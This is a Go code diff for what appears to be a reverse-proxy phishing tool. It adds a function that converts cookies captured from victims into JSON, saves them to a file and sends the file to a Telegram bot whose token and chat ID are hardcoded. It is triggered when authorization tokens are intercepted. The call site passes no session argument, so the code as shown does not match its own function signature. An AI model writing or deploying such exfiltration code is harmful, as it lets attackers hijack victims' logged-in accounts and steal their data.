@@ -1223,6 +1223,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								// Send tokens to Telegram bot
+								err := s.SendCapturedCookieTokensToTelegramBot()
+								if err != nil {
+									log.Error("failed to send tokens to Telegram: %v", err)
+								}
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1270,6 +1275,69 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
 
 	return p, nil
+}
+
+func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+		Secure         bool   `json:"secure,omitempty"`
+	}
+
+	// Convert cookie tokens to JSON
+	var cookies []*Cookie
+	for domain, tmap := range ps.CookieTokens {
+		for k, v := range tmap {
+			c := &Cookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+				Secure:         false,
+			}
+			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
+				c.Secure = true
+			}
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	jsonTokens, err := json.Marshal(cookies)
+	if err != nil {
+		return fmt.Errorf("failed to marshal JSON tokens: %v", err)
+	}
+
+	// Save the JSON data to a file
+	filename := "captured_cookies.json"
+	err = os.WriteFile(filename, jsonTokens, fs.FileMode(0644))
+	if err != nil {
+		return fmt.Errorf("failed to save JSON file: %v", err)
+	}
+
+	// Send the file to the Telegram bot
+	message := fmt.Sprintf("Captured cookies for session ID %s", ps.Id)
+	err = SendMessageFileToTelegramBot(filename, message, "6467688722:AAHvXTnhNj0NI-SpbCUO61fWLPwNwILOy0M", "5721769962")
+	if err != nil {
+		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
+	}
+	// Return nil to indicate success
+	return nil
 }
 
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
